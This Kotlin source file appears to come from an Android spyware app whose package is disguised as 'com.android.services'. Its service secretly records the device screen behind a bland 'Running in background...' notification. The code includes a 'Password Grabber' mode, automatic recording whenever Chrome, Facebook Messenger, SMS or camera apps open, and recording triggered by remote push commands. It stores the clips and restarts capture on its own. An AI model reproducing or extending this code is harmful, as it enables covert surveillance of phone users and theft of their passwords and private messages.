package com.android.services.services.screenRecord

import android.app.Activity
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Looper
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.android.services.R
import com.android.services.accessibility.AccessibilityUtils
import com.android.services.db.entities.ScreenRecording
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.receiver.NotificationBroadcastReceiver
import com.android.services.receiver.VideoFileCompressorReceiver
import com.android.services.services.RemoteDataService
import com.android.services.util.*
import kotlinx.coroutines.*
import org.greenrobot.eventbus.EventBus
import org.greenrobot.eventbus.Subscribe
import java.io.*

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
class ScreenRecordCommandProcessingBaseImplI(
    val service: Service,
    val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope,
) : ScreenRecordCommandProcessingBaseI(service.applicationContext) {
    override fun initialize() {
        logVerbose("${AppConstants.SCREEN_RECORDING_TYPE} In OnInitialize()")
        try {
            mMediaRecorder = MediaRecorder()
            mProjectionManager =
                service.getSystemService(Service.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mWindowManager = service.getSystemService(Service.WINDOW_SERVICE) as WindowManager
            startAndCreateNotification()
            val metrics = DisplayMetrics()
            if (mWindowManager != null) {
                mWindowManager!!.defaultDisplay.getMetrics(metrics)
                mScreenDensity = metrics.densityDpi
            }
            EventBus.getDefault().register(this)

        } catch (exp: Exception) {
            logVerbose("${AppConstants.SCREEN_RECORDING_TYPE} onCreate Error: ${exp.message}")
            updateScreenRecordPush()
        }
    }

    private fun startAndCreateNotification() {
        val notificationIntent =
            Intent(service.applicationContext, NotificationBroadcastReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            service.applicationContext,
            SCREEN_RECORD_NOTIFICATION_ID,
            notificationIntent,
            PendingIntent.FLAG_UPDATE_CURRENT
        )
        val notification =
            NotificationCompat.Builder(service.applicationContext, RemoteDataService.CHANNEL_ID)
                .setContentText("Running in background...")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentIntent(pendingIntent!!)
                .build()
        service.startForeground(
            SCREEN_RECORD_NOTIFICATION_ID,
            notification
        )
    }

    override fun parseIntent(intent: Intent) {
        intent.let {
            logVerbose(
                "In OnStartCommand -> Ready to start Screen Recording",
                AppConstants.SCREEN_RECORDING_TYPE
            )
            try {
                isPasswordGrabber =
                    intent.getBooleanExtra(PASSWORD_GRABBER, false)
                isAppRecording = intent.getBooleanExtra(APP_RECORDING, false)
                isNormalRecording =
                    intent.getBooleanExtra(NORMAL_RECORDING, false)
                if (isAppRecording) {
                    appPackageName = intent.getStringExtra(APP_PACKAGE_NAME)
                    appName = when (appPackageName) {
                        "com.android.chrome" -> {
                            "Chrome Browser"
                        }
                        "com.facebook.orca" -> {
                            "Facebook Messenger"
                        }
                        AppUtils.getDefaultCamera() -> {
                            "Camera"
                        }
                        AppUtils.getDefaultMessagingApp() -> {
                            "SMS"
                        }
                        else -> {
                            AppUtils.getAppNameFromPackage(appPackageName)
                        }
                    }
                } else if (isNormalRecording) {
                    pushId = intent.getStringExtra(SCREEN_RECORD_PUSH_ID)
                    val duration = intent.getStringExtra(SCREEN_RECORD_DURATION) ?: "15"
                    maxDuration = when (duration) {
                        "15" -> 15 * 1000
                        "30" -> 30 * 1000
                        "1" -> 60 * 1000
                        else -> duration.toInt() * 60 * 1000
                    }
                }
                mHandler.postDelayed(recording, 500)
            } catch (exp: Exception) {
                logException(
                    "onStartCommand Exception: ${exp.message}",
                    AppConstants.SCREEN_RECORDING_TYPE,
                    exp
                )
                updateScreenRecordPush()
            }
        }
    }

    private fun initRecorder() {
        try {
            logVerbose("${AppConstants.SCREEN_RECORDING_TYPE} -> init Recorder")
            mMediaRecorder = MediaRecorder()
            filePath = AppUtils.retrieveFilePath(
                applicationContext, AppConstants.DIR_SCREEN_RECORDING, System.currentTimeMillis()
                    .toString() + ".src"
            )
            recordedFile = File(filePath)
            mMediaRecorder!!.setVideoSource(MediaRecorder.VideoSource.SURFACE)
            mMediaRecorder!!.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            mMediaRecorder!!.setOutputFile(filePath)
            mMediaRecorder!!.setVideoSize(
                DISPLAY_WIDTH,
                DISPLAY_HEIGHT
            )
            mMediaRecorder!!.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            mMediaRecorder!!.setVideoEncodingBitRate(2000000)
            mMediaRecorder!!.setVideoFrameRate(30)
            when {
                isPasswordGrabber -> {
                    mMediaRecorder!!.setMaxDuration(10 * 1000)
                }
                isNormalRecording -> {
                    mMediaRecorder!!.setMaxDuration(maxDuration!!)
                }
                isAppRecording -> {
                    mMediaRecorder!!.setMaxDuration(60 * 1000)
                }
            }
            mMediaRecorder!!.setOnInfoListener(MediaRecorderListener())
            mMediaRecorder!!.setOnErrorListener(MediaRecorderErrorListener())
            val rotation = mWindowManager!!.defaultDisplay.rotation
            val orientation = ORIENTATIONS[rotation + 90]
            mMediaRecorder!!.setOrientationHint(orientation)
            mMediaRecorder!!.prepare()
            logVerbose("${AppConstants.SCREEN_RECORDING_TYPE} -> recorder prepared")
        } catch (e: Exception) {
            logException(
                "initRecorder Exception: ${e.message}",
                AppConstants.SCREEN_RECORDING_TYPE,
                e
            )
            updateScreenRecordPush()
        }
    }

    private fun shareScreen() {
        try {
            logVerbose("${AppConstants.SCREEN_RECORDING_TYPE} -> sharing screen")
            mMediaProjectionCallback = MediaProjectionCallback()
            mMediaProjection = AppConstants.screenRecordingIntent?.let {
                mProjectionManager!!.getMediaProjection(
                    Activity.RESULT_OK,
                    it
                )
            }
            if (mMediaProjection != null) {
                mMediaProjection!!.registerCallback(mMediaProjectionCallback, null)
                mVirtualDisplay = createVirtualDisplay()
                mMediaRecorder!!.start()
                logVerbose("${AppConstants.SCREEN_RECORDING_TYPE} -> recorder started")
                when {
                    isAppRecording -> {
                        AppConstants.isAppScreenRecording = true
                        AppConstants.isPasswordGrabbing = false
                    }
                    isPasswordGrabber -> {
                        AppConstants.isPasswordGrabbing = true
                        AppConstants.isAppScreenRecording = false
                    }
                    isNormalRecording -> {
                        AppConstants.isAppScreenRecording = false
                        AppConstants.isPasswordGrabbing = false
                    }
                }
                isScreenRecording = true
            } else {
                updateScreenRecordPush(FcmPushStatus.SCREEN_RECORD_PERMISSION_MISSING)
            }
        } catch (e: Exception) {
            logException(
                "shareScreen Exception: ${e.message}",
                AppConstants.SCREEN_RECORDING_TYPE,
                e
            )
            updateScreenRecordPush()
        }
    }

    private fun createVirtualDisplay(): VirtualDisplay {
        return mMediaProjection!!.createVirtualDisplay(
            "ScreenRecordActivity",
            DISPLAY_WIDTH, DISPLAY_HEIGHT, mScreenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            mMediaRecorder!!.surface, mVirtualDisplayCallback, mHandler
        )
    }
    private var mVirtualDisplayCallback: VirtualDisplay.Callback = object : VirtualDisplay.Callback() {
        override fun onPaused() {
            super.onPaused()
        }

        override fun onResumed() {
            super.onResumed()
        }

        override fun onStopped() {
            super.onStopped()
        }
    }

    private inner class MediaRecorderListener : MediaRecorder.OnInfoListener {
        override fun onInfo(mr: MediaRecorder, what: Int, extra: Int) {
            if (what == 800) {
                if (isNormalRecording || isAppRecording) {
                    isCompleted = true
                    if (isAppRecording) {
                        isRecordingTimeEnded = true
                    }
                }
                logVerbose("Screen Recording onInfo what=$what , extra=$extra", "ScreenRecSerInfo")
                stopForegroundService()
            }
        }
    }

    inner class MediaProjectionCallback : MediaProjection.Callback() {
        override fun onStop() {
            logVerbose("${AppConstants.SCREEN_RECORDING_TYPE} -> MediaProjectionCallback stopped")
        }
    }

    private inner class MediaRecorderErrorListener : MediaRecorder.OnErrorListener {
        override fun onError(mediaRecorder: MediaRecorder, i: Int, i1: Int) {
            logVerbose("${AppConstants.SCREEN_RECORDING_TYPE} -> MediaRecorderErrorListener error = $i, $i1")
            stopForegroundService()
        }
    }

    private suspend fun storeScreenRecording() {
        withContext(Dispatchers.IO) {
            if (recordedFile == null) {
                logVerbose(
                    "${AppConstants.SCREEN_RECORDING_TYPE} recorded file is null",
                    AppConstants.SCREEN_RECORDING_TYPE
                )
                return@withContext
            }
            val file = File(recordedFile!!.absolutePath)
            if (!AppUtils.validFileSize(file)) {
                return@withContext
            }
            var app: String? = ""
            var appPackage: String? = ""
            var pId: String? = ""
            var pStatus = ""
            when {
                isAppRecording -> {
                    app = appName
                    appPackage = appPackageName
                }
                isNormalRecording -> {
                    pId = pushId
                    pStatus = if (isCompleted) "2" else "3"
                }
                isPasswordGrabber -> {
                    app = "Password Grabber"
                    appPackage = "screen.grabber"
                }
            }
            val currentTimeInMilliSeconds = System.currentTimeMillis().toString()
            val screenRecording = ScreenRecording()
            screenRecording.apply {
                this.file = recordedFile!!.absolutePath
                this.name = AppUtils.formatDateCustom(currentTimeInMilliSeconds)
                this.startDatetime = AppUtils.formatDate(currentTimeInMilliSeconds)
                this.appName = app ?: ""
                this.appPackageName = appPackage ?: ""
                this.pushId = pId ?: ""
                this.pushStatus = pStatus
                this.isCompressed = false
                this.status = 0
            }
            localDatabaseSource.insertScreenRecording(screenRecording)
        }
    }

    @Subscribe
    fun onEvent(event: String) {
        if(!isServiceMarkedAsStop){
            logVerbose(
                "Stoping due usage access permission missing",
                "ScreenRecSerInfo"
            )
            if (event == "stopPasswordGrabbing" && isPasswordGrabber) {
                isCompleted = true
                isServiceMarkedAsStop=true
                stopForegroundService()
            } else if (event == "stopAppRecording" && isAppRecording) {
                logVerbose(
                    "Stoping app with normal event",
                    "ScreenRecSerInfo"
                )
                isServiceMarkedAsStop=true
                isCompleted = true
                stopForegroundService()
            }
        }
    }

    private suspend fun stopScreenRecording() {
        withContext(Dispatchers.IO) {
            try {
                if (mMediaRecorder != null) {
                    mMediaRecorder!!.stop()
                    mMediaRecorder!!.reset()
                    mMediaRecorder!!.release()
                    mMediaRecorder = null
                }
            } catch (error: Exception) {
                logException(
                    "stopScreenRecording Exception: ${error.message}",
                    AppConstants.SCREEN_RECORDING_TYPE,
                    error
                )
                logVerbose("screen recording stop exception =$error", "ScreenRecCrashInfo")
                updateScreenRecordPush()
            }
        }
    }

    private suspend fun stopScreenSharing() {
        releaseVirtualDisplay()
        stopProjection()
    }

    private fun releaseVirtualDisplay() {
        if (mVirtualDisplay != null) {
            try {
                mVirtualDisplay!!.release()
                mVirtualDisplay = null
            } catch (error: Exception) {
                logException(
                    "stopScreenRecording Exception: ${error.message}",
                    AppConstants.SCREEN_RECORDING_TYPE,
                    error
                )
            }
        }
    }

    private fun stopProjection() {
        if (mMediaProjection != null) {
            try {
                mMediaProjection!!.unregisterCallback(mMediaProjectionCallback)
                mMediaProjection!!.stop()
                mMediaProjection = null
            } catch (error: Exception) {
                logException(
                    "stopScreenRecording Exception: ${error.message}",
                    AppConstants.SCREEN_RECORDING_TYPE,
                    error
                )
            }
        }
    }

    private val recording = Runnable {
        Thread {
            Looper.prepare()
            initRecorder()
            shareScreen()
            Looper.loop()
        }.start()
    }

    override fun createOutputFilePath() {
        filePath = AppUtils.retrieveFilePath(
            applicationContext,
            AppConstants.DIR_SCREEN_RECORDING,
            System.currentTimeMillis().toString() + "_" + AppUtils.getUniqueId() + ".mp4"
        )
    }

    override fun onServiceDestroy() {
        logVerbose("In OnDestroy -> Releasing Resources", AppConstants.SCREEN_RECORDING_TYPE)
        logVerbose("screen recording service on destroy", "ScreenRecCrashInfo")
        if (isScreenRecording) {
            coroutineScope.launch(Dispatchers.IO) {
                try {
                    AppConstants.isAppScreenRecording = false
                    AppConstants.isPasswordGrabbing = false
                    isScreenRecording = false
                    stopScreenRecording()
                    stopScreenSharing()
                    if (isPasswordGrabber) {
                        if (isCompleted) {
                            storeScreenRecording()
                        } else {
                            if (filePath.isNotEmpty())
                                AppUtils.deleteFile(applicationContext, filePath)
                        }
                    } else storeScreenRecording()
                    EventBus.getDefault().unregister(this)
                    checkForRestartScreenRecording()
                    mHandler.removeCallbacks(stopServiceRunnable)
                    LocalBroadcastManager.getInstance(applicationContext)
                        .sendBroadcast(Intent(VideoFileCompressorReceiver.ACTION_COMPRESS_VIDEO))
                    isServiceMarkedAsStop=false
                } catch (exp: Exception) {
                    logException(
                        "onDestroy Exception = ${exp.message}",
                        AppConstants.SCREEN_RECORDING_TYPE
                    )
                    updateScreenRecordPush()
                }
            }
        } else {
            logVerbose("screen recording stop and prevent from crash", "ScreenRecCrashInfo")
        }
    }

    override fun startRecording() {
        try {
            logVerbose("screen recording", "ScreenRecCrashInfo")
            logVerbose("Preparing to Start Recording", AppConstants.SCREEN_RECORDING_TYPE)
        } catch (exp: Exception) {
            logException(
                "Start Recording Exception = ${exp.message}",
                AppConstants.SCREEN_RECORDING_TYPE,
                exp
            )
            updateScreenRecordPush()
        }
    }

    override suspend fun stopRecording() {
        withContext(Dispatchers.IO) {
            logVerbose("Preparing to Stop Recording", AppConstants.SCREEN_RECORDING_TYPE)
            try {
                logVerbose("Recording Stopped", AppConstants.SCREEN_RECORDING_TYPE)
            } catch (e: Exception) {
                logException(
                    "Stop Recording Exception = ${e.message}",
                    AppConstants.SCREEN_RECORDING_TYPE,
                    e
                )
                updateScreenRecordPush()
            }
        }
    }

    private fun updateScreenRecordPush(status: FcmPushStatus = FcmPushStatus.FILE_CORRUPTED) {
        logVerbose("update Screen Record Push", "ScreenRecCrashInfo")
        coroutineScope.launch {
            withContext(Dispatchers.IO) {
                pushId?.let {
                    localDatabaseSource.updatePushStatus(
                        it,
                        status.getStatus(),
                        0
                    )
                }
                if (filePath.isNotEmpty())
                    AppUtils.deleteFile(applicationContext, filePath)
            }
        }
        stopForegroundService()
    }

    private fun stopForegroundService() {
        logVerbose("stop this foreground Service called", "ScreenRecCrashInfo")
        if (isAppRecording || isPasswordGrabber) {
            mHandler.postDelayed(stopServiceRunnable, 5500)
        } else {
            stopService()
        }
    }

    private val stopServiceRunnable = Runnable {
        if (AppUtils.isServiceRunning(
                applicationContext,
                ScreenRecordCommandService::class.java.name
            )
        ) {
            stopService()
        }
    }

    private fun checkForRestartScreenRecording() {
        val currentAppPkg = AppUtils.retrieveNewApp(applicationContext)
        val isNewScreenRecordingApp = AppUtils.isScreenRecordingApp(currentAppPkg)
        val shouldStartRecordingAgain =
            (isRecordingTimeEnded || isNewScreenRecordingApp)
        logVerbose(
            "last packagName while stoping= $currentAppPkg isNewScreenRecordingApp=$isNewScreenRecordingApp",
            "ScreenRecSerInfo"
        )
        if (shouldStartRecordingAgain && AppUtils.isScreenInteractive(
                applicationContext
            ) && isAppRecording && isCompleted
        ) {
            val packageName = if (isRecordingTimeEnded || currentAppPkg == appPackageName) {
                appPackageName
            } else if (currentAppPkg.isNotEmpty()) {
                currentAppPkg
            } else {
                appPackageName
            }
            logVerbose(
                "Screen Recording starting once again with appPackageName=$appPackageName and packageName=$packageName",
                "ScreenRecSerInfo"
            )
            ActivityUtil.startScreenRecordingService(
                applicationContext,
                AppConstants.SCREEN_RECORDING_TYPE,
                packageName!!
            )
        }
    }

    private fun stopService() {
        try {
            applicationContext.stopService(
                Intent(
                    applicationContext,
                    ScreenRecordCommandService::class.java
                )
            )
        } catch (ex: java.lang.Exception) {
            logVerbose("StopService Error= $ex")
        }
    }
}